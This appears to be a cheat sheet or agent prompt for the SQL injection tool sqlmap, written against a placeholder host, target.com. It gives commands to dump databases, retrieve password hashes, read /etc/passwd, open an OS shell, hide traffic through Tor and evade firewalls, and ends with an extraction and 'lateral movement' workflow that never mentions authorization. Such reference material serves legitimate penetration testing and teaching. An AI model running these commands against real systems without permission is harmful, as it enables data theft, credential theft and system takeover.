# SQLMap Tool Usage Prompt

## Overview

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.

## Basic Usage

### Syntax

```bash
sqlmap [options]
```

### Quick Start

```bash
# Basic SQL injection test
sqlmap -u "http://target.com/page.php?id=1"

# With POST data
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"

# With cookies
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"
```

## Common Options

### Target Specification

| Option | Description | Example |
|--------|-------------|---------|
| `-u` | URL | `-u "http://target.com/?id=1"` |
| `-m` | Target list file | `-m targets.txt` |
| `-r` | Request file | `-r request.txt` |
| `-d` | Direct connection | `-d "mysql://user:pass@host:port/db"` |
| `-l` | Log file (Burp/WebScarab) | `-l burp.log` |

### Request Options

```bash
# POST data
sqlmap -u "http://target.com/login.php" \
  --data="username=admin&password=test"

# HTTP headers
sqlmap -u "http://target.com/" \
  --headers="User-Agent: Mozilla/5.0" \
  --headers="Authorization: Bearer token123"

# Cookies
sqlmap -u "http://target.com/" \
  --cookie="PHPSESSID=abc123; security=low"

# User agent spoofing
sqlmap -u "http://target.com/" \
  --random-agent
```

### Injection Options

```bash
# Specify parameter
sqlmap -u "http://target.com/?id=1&name=test" \
  -p "id"  # Test only 'id' parameter

# Specify type
sqlmap -u "http://target.com/?id=1" \
  --param-type="string"

# Specify technique
sqlmap -u "http://target.com/?id=1" \
  --technique="BEUSTQ"
  # B: Boolean-based blind
  # E: Error-based
  # U: Union query-based
  # S: Stacked queries
  # T: Time-based blind
  # Q: Inline query-based
```

## Detection Level

```bash
# Level 1 (default): Always perform basic tests
sqlmap -u "http://target.com/?id=1" --level=1

# Level 2: Cookie + Level 1 tests
sqlmap -u "http://target.com/?id=1" --level=2

# Level 3: User-agent + Referer + Level 2
sqlmap -u "http://target.com/?id=1" --level=3

# Level 5: All parameters + all headers
sqlmap -u "http://target.com/?id=1" --level=5
```

## Risk Level

```bash
# Risk 1 (default): Harmless tests
sqlmap -u "http://target.com/?id=1" --risk=1

# Risk 2: Add heavy time-based queries
sqlmap -u "http://target.com/?id=1" --risk=2

# Risk 3: Add OR SQL injection tests (can modify data!)
sqlmap -u "http://target.com/?id=1" --risk=3
```

## Enumeration Options

### Database Enumeration

```bash
# List databases
sqlmap -u "http://target.com/?id=1" --dbs

# List tables in database
sqlmap -u "http://target.com/?id=1" -D database_name --tables

# List columns in table
sqlmap -u "http://target.com/?id=1" -D database_name -T users --columns

# Dump data
sqlmap -u "http://target.com/?id=1" -D database_name -T users --dump

# Dump all databases
sqlmap -u "http://target.com/?id=1" --dump-all
```

### Advanced Enumeration

```bash
# List users
sqlmap -u "http://target.com/?id=1" --users

# List passwords
sqlmap -u "http://target.com/?id=1" --passwords

# List privileges
sqlmap -u "http://target.com/?id=1" --privileges

# List roles
sqlmap -u "http://target.com/?id=1" --roles

# Execute shell commands (if privileges allow)
sqlmap -u "http://target.com/?id=1" --os-shell

# Read system files
sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"
```

## Technique-Specific Usage

### Boolean-Based Blind

```bash
sqlmap -u "http://target.com/?id=1" \
  --technique=B \
  --threads=5 \
  --time-sec=5
```

### Error-Based

```bash
sqlmap -u "http://target.com/?id=1" \
  --technique=E \
  --batch
```

### Union Query

```bash
sqlmap -u "http://target.com/?id=1" \
  --technique=U \
  --union-cols=5 \
  --union-char="a"
```

### Time-Based Blind

```bash
sqlmap -u "http://target.com/?id=1" \
  --technique=T \
  --time-sec=10
```

## Custom Injection

### Custom Payload

```bash
sqlmap -u "http://target.com/?id=1" \
  --prefix="' OR '" \
  --suffix="-- -"

# Use tamper scripts
sqlmap -u "http://target.com/?id=1" \
  --tamper=space2comment,between
```

### Available Tamper Scripts

```bash
# space2comment: Replaces space with comment
sqlmap --tamper=space2comment

# between: Replaces > with NOT BETWEEN 0 AND
sqlmap --tamper=between

# charencode: URL-encode characters
sqlmap --tamper=charencode

# space2plus: Replaces space with +
sqlmap --tamper=space2plus

# randomcase: Random case conversion
sqlmap --tamper=randomcase

# chainedtopause: Combines tamper scripts
sqlmap --tamper=between,charencode,randomcase
```

## Output Options

```bash
# Verbose output
sqlmap -u "http://target.com/?id=1" -v 3

# Levels:
# 0: Show only Python tracebacks, errors, CRITICAL
# 1: Show only level warnings and Python errors
# 2: Show also level INFO messages
# 3: Show also level DEBUG messages
# 4: Show also level TRACE messages

# Output file
sqlmap -u "http://target.com/?id=1" \
  -o \
  --output-dir=/path/to/output

# Suppress default output
sqlmap -u "http://target.com/?id=1" --quiet

# Parseable output
sqlmap -u "http://target.com/?id=1" --parse-errors
```

## Batch Mode

```bash
# Automatic responses to prompts
sqlmap -u "http://target.com/?id=1" --batch

# Non-interactive mode
sqlmap -u "http://target.com/?id=1" \
  --batch \
  --smart
```

## Advanced Options

### Threading

```bash
sqlmap -u "http://target.com/?id=1" \
  --threads=10
```

### Proxy

```bash
# HTTP proxy
sqlmap -u "http://target.com/?id=1" \
  --proxy="http://127.0.0.1:8080"

# SOCKS proxy
sqlmap -u "http://target.com/?id=1" \
  --proxy="socks5://127.0.0.1:9050"
```

### Tor Network

```bash
sqlmap -u "http://target.com/?id=1" \
  --tor \
  --tor-port=9050 \
  --tor-type=SOCKS5
```

### WAF Evasion

```bash
sqlmap -u "http://target.com/?id=1" \
  --random-agent \
  --delay=1 \
  --timeout=60
```

## Useful One-Liners

```bash
# Quick scan with basic enumeration
sqlmap -u "http://target.com/?id=1" --batch --dbs

# Full database dump
sqlmap -u "http://target.com/?id=1" --batch --dump --all

# File read
sqlmap -u "http://target.com/?id=1" --batch --file-read=/etc/passwd

# OS shell (requires privileges)
sqlmap -u "http://target.com/?id=1" --batch --os-shell

# Crawl and test
sqlmap -u "http://target.com/" --batch --crawl=3
```

## Testing Workflow

```yaml
sqlmap_workflow:
  1_discovery:
    command: |
      sqlmap -u "http://target.com/?id=1" \
        --batch --dbs
  
  2_database_analysis:
    command: |
      sqlmap -u "http://target.com/?id=1" \
        -D target_db --tables --batch
  
  3_data_extraction:
    command: |
      sqlmap -u "http://target.com/?id=1" \
        -D target_db -T users --dump --batch
  
  4_privilege_escalation:
    command: |
      sqlmap -u "http://target.com/?id=1" \
        --passwords --batch
  
  5_lateral_movement:
    command: |
      sqlmap -u "http://target.com/?id=1" \
        --os-shell --batch
```

---

**Use SQLMap to efficiently detect and exploit SQL injection vulnerabilities.**
